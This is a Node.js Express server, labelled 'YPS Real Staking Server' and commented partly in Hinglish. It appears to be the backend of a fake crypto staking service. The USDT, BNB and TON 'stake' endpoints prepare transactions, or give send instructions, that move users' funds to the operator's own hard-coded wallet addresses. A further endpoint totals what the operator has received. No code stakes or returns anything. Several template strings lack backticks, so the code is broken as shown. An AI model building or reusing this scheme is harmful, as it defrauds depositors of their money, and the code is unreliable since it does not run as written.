const express = require('express');
const Web3 = require('web3');
const ethers = require('ethers');
const cors = require('cors');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Your ACTUAL Wallet Addresses - YAHI PE TRANSFER HOGA
const YOUR_ADDRESSES = {
    USDT: '0xa7eb3e6bae09b4c67d6e85eb76ad71beaffa385a', // Your USDT address
    BNB: '0x0aca7c8998cb357a74a879f5b665ef4aec306448', // Your BNB address  
    TON: 'EQBX63RAdgShn34EAFMV73Cut7Z15lUZd1hnVva68SEl7sxi' // Your TON address
};

// Contract Addresses
const CONTRACT_ADDRESSES = {
    USDT: '0x55d398326f99059fF775485246999027B3197955', // BSC Mainnet USDT
    STAKING_USDT: YOUR_ADDRESSES.USDT, // Aapka USDT address
    STAKING_BNB: YOUR_ADDRESSES.BNB,   // Aapka BNB address
    STAKING_TON: YOUR_ADDRESSES.TON    // Aapka TON address
};

// USDT ABI
const USDT_ABI = [
    {
        "constant": false,
        "inputs": [
            {"name": "_to", "type": "address"},
            {"name": "_value", "type": "uint256"}
        ],
        "name": "transfer",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [],
        "name": "decimals",
        "outputs": [{"name": "", "type": "uint8"}],
        "type": "function"
    }
];

// Initialize Web3
const web3 = new Web3('https://bsc-dataseed.binance.org/');

// REAL TRANSFER ENDPOINTS - Aapke addresses pe

// Real USDT Transfer to YOUR address
app.post('/api/real-stake/usdt', async (req, res) => {
    try {
        const { userAddress, amount } = req.body;
        
        if (!web3.utils.isAddress(userAddress)) {
            return res.status(400).json({ error: 'Invalid user address' });
        }

        const usdtContract = new web3.eth.Contract(USDT_ABI, CONTRACT_ADDRESSES.USDT);
        const decimals = await usdtContract.methods.decimals().call();
        const amountInWei = (amount * Math.pow(10, decimals)).toString();

        // REAL TRANSACTION - User ke wallet se AAPKE USDT ADDRESS pe
        const transactionData = {
            from: userAddress,
            to: CONTRACT_ADDRESSES.USDT,
            value: '0x0',
            gas: '100000',
            gasPrice: web3.utils.toWei('5', 'gwei'),
            data: usdtContract.methods.transfer(YOUR_ADDRESSES.USDT, amountInWei).encodeABI()
        };

        res.json({
            success: true,
            message: 'Real USDT transfer ready',
            transaction: transactionData,
            toAddress: YOUR_ADDRESSES.USDT, // Aapka USDT address
            amount: amount,
            currency: 'USDT',
            note: Amount ${amount} USDT will be transferred to your wallet: ${YOUR_ADDRESSES.USDT}
        });

    } catch (error) {
        console.error('Real USDT transfer error:', error);
        res.status(500).json({ error: 'Transfer preparation failed' });
    }
});

// Real BNB Transfer to YOUR address
app.post('/api/real-stake/bnb', async (req, res) => {
    try {
        const { userAddress, amount } = req.body;
        
        if (!web3.utils.isAddress(userAddress)) {
            return res.status(400).json({ error: 'Invalid user address' });
        }

        const amountInWei = web3.utils.toWei(amount.toString(), 'ether');

        // REAL BNB TRANSACTION - Direct AAPKE BNB ADDRESS pe
        const transactionData = {
            from: userAddress,
            to: YOUR_ADDRESSES.BNB, // Aapka BNB address
            value: amountInWei,
            gas: '21000',
            gasPrice: web3.utils.toWei('5', 'gwei')
        };

        res.json({
            success: true,
            message: 'Real BNB transfer ready',
            transaction: transactionData,
            toAddress: YOUR_ADDRESSES.BNB, // Aapka BNB address
            amount: amount,
            currency: 'BNB',
            note: Amount ${amount} BNB will be transferred to your wallet: ${YOUR_ADDRESSES.BNB}
        });

    } catch (error) {
        console.error('Real BNB transfer error:', error);
        res.status(500).json({ error: 'Transfer preparation failed' });
    }
});

// Real TON Transfer to YOUR address
app.post('/api/real-stake/ton', async (req, res) => {
    try {
        const { amount } = req.body;

        // TON TRANSFER - AAPKE TON ADDRESS pe
        res.json({
            success: true,
            message: 'TON transfer instructions',
            toAddress: YOUR_ADDRESSES.TON, // Aapka TON address
            amount: amount,
            currency: 'TON',
            memo: '583947', // Your TON memo
            note: Please send ${amount} TON to: ${YOUR_ADDRESSES.TON} with memo: 583947,
            instructions: User needs to manually send ${amount} TON to your TON address
        });

    } catch (error) {
        console.error('TON transfer error:', error);
        res.status(500).json({ error: 'TON transfer failed' });
    }
});

// Check YOUR wallet balances
app.get('/api/my-wallet-balances', async (req, res) => {
    try {
        // USDT Balance - Aapka USDT address
        const usdtContract = new web3.eth.Contract(USDT_ABI, CONTRACT_ADDRESSES.USDT);
        const usdtBalance = await usdtContract.methods.balanceOf(YOUR_ADDRESSES.USDT).call();
        const decimals = await usdtContract.methods.decimals().call();
        const usdtBalanceFormatted = usdtBalance / Math.pow(10, decimals);

        // BNB Balance - Aapka BNB address
        const bnbBalance = await web3.eth.getBalance(YOUR_ADDRESSES.BNB);
        const bnbBalanceFormatted = web3.utils.fromWei(bnbBalance, 'ether');

        res.json({
            success: true,
            yourAddresses: YOUR_ADDRESSES,
            balances: {
                USDT: usdtBalanceFormatted,
                BNB: bnbBalanceFormatted,
                TON: 'Check in TON wallet' // TON balance different method se
            },
            totalReceived: {
                USDT: usdtBalanceFormatted,
                BNB: bnbBalanceFormatted
            }
        });

    } catch (error) {
        console.error('Balance check error:', error);
        res.status(500).json({ error: 'Failed to fetch balances' });
    }
});

// Transaction history for YOUR addresses
app.get('/api/my-transactions', async (req, res) => {
    try {
        res.json({
            success: true,
            yourAddresses: YOUR_ADDRESSES,
            transactions: [
                // Yaha aapke actual transactions aayenge
            ],
            note: 'All staking amounts come to these addresses'
        });
    } catch (error) {
        console.error('Transaction history error:', error);
        res.status(500).json({ error: 'Failed to fetch transactions' });
    }
});

app.listen(PORT, () => {
    console.log(🚀 YPS Real Staking Server Started);
    console.log(💰 YOUR USDT Address: ${YOUR_ADDRESSES.USDT});
    console.log(💰 YOUR BNB Address: ${YOUR_ADDRESSES.BNB}); 
    console.log(💰 YOUR TON Address: ${YOUR_ADDRESSES.TON});
    console.log(🌐 Visit: http://localhost:${PORT});
});